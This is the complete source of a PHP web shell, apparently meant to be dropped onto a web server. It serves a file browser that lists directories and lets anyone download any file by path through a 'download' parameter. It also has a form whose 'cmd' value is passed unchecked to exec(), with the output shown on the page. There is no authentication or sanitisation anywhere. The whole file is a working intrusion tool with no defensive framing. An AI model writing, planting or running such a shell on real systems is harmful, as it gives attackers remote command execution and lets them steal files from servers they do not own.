<?php
if (isset($_GET['download'])) {
	$file = $_GET['download'];
	if (file_exists($file)) {
	    header('Content-Description: File Transfer');
	    header('Content-Type: application/octet-stream');
	    header('Content-Disposition: attachment; filename="'.basename($file).'"');
	    header('Expires: 0');
	    header('Cache-Control: must-revalidate');
	    header('Pragma: public');
	    header('Content-Length: ' . filesize($file));
	    readfile($file);
	    exit;
	}
}

?>

<html>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">


<?php
$dir = "";
if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
}
if (isset($_POST['dir'])) {
	$dir = $_POST['dir'];
}
$file = '';
if ($dir == NULL or !is_dir($dir)) {
	if (is_file($dir)) {
		echo "enters";
		$file = $dir;
		echo $file;
	}
	$dir = './';
}
$dir = realpath($dir.'\\');


$dirs = scandir($dir);
echo "<h2>Viewing directory " . $dir . "</h2>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='exec cmd'>\n";
echo "</form>";

if (isset($_GET['cmd'])) {
	echo "<br><br><b>Result of command execution: </b><br>";
	exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
	foreach ($cmdresult as $key => $value) {
		echo "$value \n<br>";
	}
}
echo "<br>";
?>

<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name (Click to download)</th>
      </tr>
    </thead>
    <tbody>
<?php
foreach ($dirs as $key => $value) {
	echo "<tr>";
	if (is_dir(realpath($dir.'/'.$value))) {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a></td><td>Directory</td>";
	}
	else {
		echo "<td><a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a></td>";
	}
	echo "</tr>";
}
echo "</tbody>";
echo "</table>";


?>



</div>
</html>
</html>